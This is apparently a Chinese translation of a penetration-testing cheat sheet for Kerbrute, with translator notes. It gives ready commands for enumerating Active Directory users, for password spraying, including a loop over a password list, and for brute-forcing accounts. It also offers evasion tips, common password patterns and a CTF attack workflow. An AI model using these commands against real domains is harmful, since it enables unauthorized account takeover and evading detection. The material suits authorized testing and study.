# 🔑 Kerbrute - Kerberos 用户枚举

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Kerberos 预身份验证暴力破解工具
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 目录

- [Kerbrute 是什么](#-what-is-kerbrute)
- [安装](#-installation)
- [用户枚举](#-user-enumeration)
- [密码喷洒](#-password-spraying)
- [暴力破解](#-brute-force)
- [速查表](#-quick-reference)

---

<a id="-what-is-kerbrute"></a>

## 🎯 Kerbrute 是什么

**Kerbrute** 利用 Kerberos 预身份验证机制枚举用户并进行密码喷洒（Password Spraying，即用同一个密码测试多个帐户）：

- 🔍 **用户枚举**：无需凭据即可查找有效的用户名！
- 🔐 **密码喷洒**：用一个密码测试多个用户
- 💥 **暴力破解**：全面测试凭据
- 🚫 **没有锁定风险**：预身份验证失败不会触发帐户锁定

> **原文纠错：** 上述“没有锁定风险”和下表对 Kerberos 的概括不适用于密码喷洒或暴力破解：错误密码会计入失败次数并可能锁定帐户。`userenum` 不提交密码，与实际密码验证不同；后者也可能产生事件 4771。参见[上游说明](https://github.com/ropnop/kerbrute)和 Microsoft 的 [4771 事件文档](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771)。

### 为什么使用 Kerbrute？

| 方法 | 是否触发帐户锁定 | 是否产生日志 |
|--------|------------------|----------------|
| LDAP 绑定 | 是 | 是 |
| SMB 身份验证 | 是 | 是 |
| **Kerberos 预身份验证** | **否** | 很少 |

---

<a id="-installation"></a>

## 🚀 安装

> **版本说明：** 原文二进制下载固定为 `v1.0.3`，源码安装则使用 `@latest`；二者不应假定为同一版本。下文未经静默改写，应结合所用版本的帮助信息理解。参见[上游仓库](https://github.com/ropnop/kerbrute)。

### 下载二进制程序

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows（PowerShell）
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### 从源码安装

```bash
go install github.com/ropnop/kerbrute@latest
```

### 验证安装

```bash
kerbrute --help
```

---

<a id="-user-enumeration"></a>

## 🔍 用户枚举

### 基本用法

```bash
# 使用字典枚举用户
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# 使用域控制器的主机名
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

> **选项说明：** 所引上游参数定义未提供 `--json`；该示例可能无法运行。`-o` 保存的是日志，而非仅含有效用户名或有效凭据的纯文本列表。参见[上游参数定义](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go)。

### 输出选项

```bash
# 详细输出
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# 输出到文件
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# JSON 输出
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

> **线程说明：** 上游帮助将非零 `--delay` 描述为使用单线程，因此不能假定示例中的 `-t` 值仍按字面生效；具体行为需核对所用版本的实现。延迟也不保证不会锁定帐户或被检测到。参见[参数定义](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go)与[初始化实现](https://github.com/ropnop/kerbrute/blob/master/cmd/setup.go)。

### 线程设置

```bash
# 增加线程数（默认：10）
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# 安全的线程设置
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### 输出示例

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

<a id="-password-spraying"></a>

## 🔐 密码喷洒

### 基本密码喷洒

```bash
# 使用单个密码测试多个用户
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# 从文件读取
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

> **示例解读：** 上方“从文件读取”指的是从 `users.txt` 读取用户，密码仍直接写在命令行中。下方循环的固定等待时间不构成符合任意锁定策略的保证。`--safe` 也只是发现帐户已锁定后停止，不能预先保证不发生锁定。参见[上游说明](https://github.com/ropnop/kerbrute)。

### 多个密码

```bash
# 喷洒多个密码（每次只使用一个！）
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # 每轮喷洒之间等待 5 分钟
done
```

### 输出

```bash
# 输出有效凭据
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### 输出示例

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### 安全地进行密码喷洒

```bash
# 先检查密码策略！
crackmapexec ldap DC01 -u user -p pass --password-policy

# 降低并发并放慢尝试速度
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

<a id="-brute-force"></a>

## 💥 暴力破解

> **命令澄清：** 下方 `bruteuser` 对 `admin` 这一个用户逐个测试密码列表，并非遍历所有用户与密码的笛卡尔积；`bruteforce` 则测试输入文件中已有的组合。参见[上游命令定义](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteuser.go)。

### 完整的暴力破解

```bash
# 测试所有 username:password 组合
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### 组合列表

```bash
# 使用 username:password 格式
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# creds.txt 格式：
# admin:Password1
# john:Summer2024
```

---

<a id="-quick-reference"></a>

## 📊 速查表

### 命令

| 命令 | 说明 |
|---------|-------------|
| `userenum` | 枚举有效的用户名 |
| `passwordspray` | 使用指定密码测试多个用户 |
| `bruteuser` | 对单个用户进行暴力破解 |
| `bruteforce` | 测试 user:pass 组合 |

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `-d` | 域名 |
| `--dc` | 域控制器的 IP 地址或主机名 |
| `-t` | 线程数（默认：10） |
| `-o` | 输出文件 |
| `-v` | 详细输出 |
| `--delay` | 尝试之间的延迟（毫秒） |

### 用户枚举

```bash
# 基本用法
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# 保存输出
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# 快速模式
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### 密码喷洒

```bash
# 基本密码喷洒
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# 安全的密码喷洒
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### 用户枚举字典

```bash
# 常见姓名
/usr/share/seclists/Usernames/Names/names.txt

# 常见用户名
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 自定义格式
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### 常见密码

下面的分类中，`Season+Year` 表示“季节+年份”，`Company+Num` 表示“公司+数字”，`Generic` 表示通用密码；样例字符串按原文保留。

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 CTF 提示

1. **始终先枚举用户**：无需凭据即可获取用户名！
2. **检查 AS-REP**：找到用户后，检查哪些用户不要求预身份验证
3. **谨慎进行密码喷洒**：每次只尝试一个密码，然后等待
4. **检查策略**：了解帐户锁定阈值
5. **使用延迟**：避免被检测到

> **文件格式说明：** 下方第一步的 `-o users.txt` 生成带日志内容的文件，不能直接视为下一步需要的纯用户名列表；其输出还可能包含时间戳、状态标签和域信息。原流程按原文保留。参见[日志参数定义](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go)和[枚举实现](https://github.com/ropnop/kerbrute/blob/master/cmd/userenum.go)。

### 工作流程

```bash
# 1. 枚举用户
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. 检查 AS-REP Roasting 候选目标
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. 密码喷洒
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 参考资源

- [Kerbrute GitHub 仓库](https://github.com/ropnop/kerbrute)
- [ropnop 博客](https://blog.ropnop.com/)

### 相关速查表
- [AD 测试方法](../../AD-Attack-Methodology/translations/README.zh-CN.md)
- [Rubeus](../../Rubeus/translations/README.zh-CN.md)
- [CrackMapExec](../../CrackMapExec/translations/README.zh-CN.md)

---

<p align="center">
  <b>🔑 枚举用户，进行密码喷洒！</b><br>
  <i>Kerbrute - 隐蔽的切入方式</i>
</p>
